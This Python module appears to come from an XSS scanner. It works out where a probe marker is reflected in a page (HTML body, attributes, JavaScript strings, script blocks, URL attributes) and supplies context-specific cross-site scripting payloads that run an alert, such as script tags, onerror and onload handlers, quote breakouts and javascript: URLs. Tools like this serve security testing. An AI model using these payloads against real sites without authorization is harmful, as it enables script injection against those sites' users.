"""Context-aware payload engine.

The point is CONTEXT DETECTION, not payload volume. Detect where the
reflection lands, pick a payload that breaks that specific context.
Generic payload lists are why scanners have 90% false positive rates.

Design:
  - detect_context(body, marker_offset) -> Context
  - payloads_for(context) -> list[str]   (ordered, most likely first)
  - the scanner tries each until the oracle proves one
"""
from __future__ import annotations
from dataclasses import dataclass
from enum import Enum


class Context(str, Enum):
    HTML_BODY = "html_body"
    ATTR_DOUBLE = "attr_double"
    ATTR_SINGLE = "attr_single"
    ATTR_UNQUOTED = "attr_unquoted"
    JS_STRING_DOUBLE = "js_string_double"
    JS_STRING_SINGLE = "js_string_single"
    SCRIPT_BLOCK = "script_block"
    URL_ATTR = "url_attr"
    UNKNOWN = "unknown"


@dataclass
class Detected:
    context: Context
    quote_char: str | None = None   # the quote we need to break, if any


# -- detection -------------------------------------------------------------

def _scan_back(text: str, idx: int, window: int = 400) -> str:
    """Return the chunk of markup immediately preceding the reflection."""
    start = max(0, idx - window)
    return text[start:idx]


def _inside_tag(chunk: str) -> tuple[bool, str]:
    """Are we inside a tag? Returns (inside, tag_name). Crude but effective."""
    lt = chunk.rfind("<")
    gt = chunk.rfind(">")
    if lt > gt and lt != -1:
        # find the tag name after '<'
        name = chunk[lt + 1:].split()[0].rstrip(">/") if chunk[lt + 1:] else ""
        return True, name.lower()
    return False, ""


def _inside_script(chunk: str) -> bool:
    last_open = chunk.rfind("<script")
    last_close = chunk.rfind("</script")
    return last_open > last_close and last_open != -1


def _attr_quote_context(chunk: str) -> tuple[Context, str | None]:
    """Given we're inside a tag, determine which attribute context we're in."""
    # walk backwards from the reflection to the nearest '<'
    lt = chunk.rfind("<")
    inside = chunk[lt + 1:]
    # current attribute name: text after the last whitespace before reflection
    # and the quote state
    dq = inside.count('"')
    sq = inside.count("'")
    if dq % 2 == 1:
        return Context.ATTR_DOUBLE, '"'
    if sq % 2 == 1:
        return Context.ATTR_SINGLE, "'"
    # no unbalanced quote: unquoted attr value, or a bare attribute
    return Context.ATTR_UNQUOTED, None


def detect_context(body: str, marker_offset: int) -> Detected:
    chunk = _scan_back(body, marker_offset)

    # script block first: it dominates everything else
    if _inside_script(chunk):
        # are we inside a quoted JS string within the script?
        script_chunk = chunk[chunk.rfind("<script") + 7:]
        dq = script_chunk.count('"')
        sq = script_chunk.count("'")
        if dq % 2 == 1:
            return Detected(Context.JS_STRING_DOUBLE, '"')
        if sq % 2 == 1:
            return Detected(Context.JS_STRING_SINGLE, "'")
        return Detected(Context.SCRIPT_BLOCK, None)

    inside, tag_name = _inside_tag(chunk)
    if inside:
        # URL-bearing attributes
        lowered = chunk.lower()
        for url_attr in ("href=", "src=", "action=", "formaction="):
            if url_attr in lowered[lowered.rfind("<"):]:
                return Detected(Context.URL_ATTR, None)
        ctx, q = _attr_quote_context(chunk)
        return Detected(ctx, q)

    return Detected(Context.HTML_BODY, None)


# -- payloads --------------------------------------------------------------

def payloads_for(ctx: Context, pid_marker: str = "hxprobe") -> list[str]:
    """Ordered payloads for a context. {M} is replaced by the probe marker."""
    a = f"alert('{pid_marker}')"
    m = pid_marker

    table: dict[Context, list[str]] = {
        Context.HTML_BODY: [
            f"<script>{a}</script>",
            f"<img src=x onerror={a}>",
            f"<svg onload={a}>",
        ],
        Context.ATTR_DOUBLE: [
            f'"><script>{a}</script>',
            f'" onmouseover="{a}" x="',
            f'"><img src=x onerror={a}>',
        ],
        Context.ATTR_SINGLE: [
            f"'><script>{a}</script>",
            f"' onmouseover='{a}' x='",
            f"'><img src=x onerror={a}>",
        ],
        Context.ATTR_UNQUOTED: [
            f" onmouseover={a} x=",
            f"><script>{a}</script>",
        ],
        Context.JS_STRING_DOUBLE: [
            f'";{a};//',
            f'";{a};var x="',
            f"\\';{a};//",          # escaped-quote fallback
        ],
        Context.JS_STRING_SINGLE: [
            f"');{a};//",
            f"';{a};//",
            f"';{a};var x='",
        ],
        Context.SCRIPT_BLOCK: [
            f";{a};//",
            f"{a};//",
            f"*/{a}/*",
        ],
        Context.URL_ATTR: [
            f'"><script>{a}</script>',
            f"javascript:{a}",
            f"javascript:{a}//",
            f"data:text/html,<script>{a}</script>",
        ],
    }
    return table.get(ctx, table[Context.HTML_BODY])